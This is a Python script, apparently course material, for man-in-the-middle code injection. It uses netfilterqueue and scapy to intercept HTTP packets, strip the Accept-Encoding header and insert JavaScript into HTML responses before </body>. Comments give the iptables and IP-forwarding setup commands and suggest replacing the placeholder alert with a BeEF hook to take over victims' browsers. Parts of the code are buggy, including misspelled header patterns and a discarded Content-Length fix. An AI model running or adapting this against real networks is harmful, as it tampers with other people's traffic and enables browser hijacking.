#! /usr/bin/env python

#to modify the http request and html code
# extended from download_replace.py


#on cli > iptables -I FORWARD -j NFQUEUE --queue-num 0
# FORWARD is used only when requests is coming from other computer
# OUTPUT is used only when requests is coming from same computer
# INPUT is used only when requests is coming from same computer
# so use that on cli command 2 times first on input then on output with same --queue-num 0


# use pythex to build a rule to capture Aceept encoding: evrthing til first \r\n
# rule = Aceept Encoding:.*?//r//n

import netfilterqueue
import scapy.all as scapy
import re

def set_load(scapy_pack,load):
    scapy_pack[scapy.Raw].load = load
    del scapy_pack[scapy.IP].len
    del scapy_pack[scapy.IP].chksum
    del scapy_pack[scapy.TCP].chksum
    return scapy_pack

ack_list = []
def packet_process(packet):
    scapy_pack = scapy.IP(packet.get_payload())
    #1 print(scapy_pack.show())
    if scapy_pack.haslayer(scapy.Raw):
        load = scapy_pack[scapy.Raw].load
        if scapy_pack[scapy.TCP].dport == 80:
            print("[+]HTTP request")
            #2 print(scapy_pack.show())
            load = re.sub("Aceept Encoding:.*?\\r\\n", "", load)
            # we can modify the request but that we require us to establish a handshake
            # so we try to modify the response as the handshake will already be established
        elif scapy_pack[scapy.TCP].sport == 80:
            print("[+]Response")
            injection_code = "<script>alert('test')</script>"
            load = load.replace("</body>", injection_code+"</body>")
            #this code might not work on every http website because in the response
            # websites send the content length as well and since we are injecting code we are chnaging lenth
            # which stops the execution of website code after the specified length
            content_len_search = re.search("(?:Content length:\s)(\d*)", load)
            if content_len_search and "text/html" in load:
                content_len = content_len_search.group(1)
                new_content_len = int(content_len) + len(injection_code)
                load.replace(content_len, str(new_content_len))
            print(scapy_pack.show())  # to see whats inside the packet
            # print(packet) # it will only give output like TCP 40 bytes
        if load != scapy_pack[scapy.Raw].load:
            new_pack = set_load(scapy_pack, load)
            packet.set_payload(str(new_pack))

    packet.accept()
            #print("[+]HTTP response")


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, packet_process)
queue.run()



# the yrl link can be anyfile which even we can serve from our kali server
#todo ~echo 1 > /proc/sys/net/ipv4/ip_forward to allow kali forward the requests


# replace injection code with the code provided by beef to hoook a computer to beef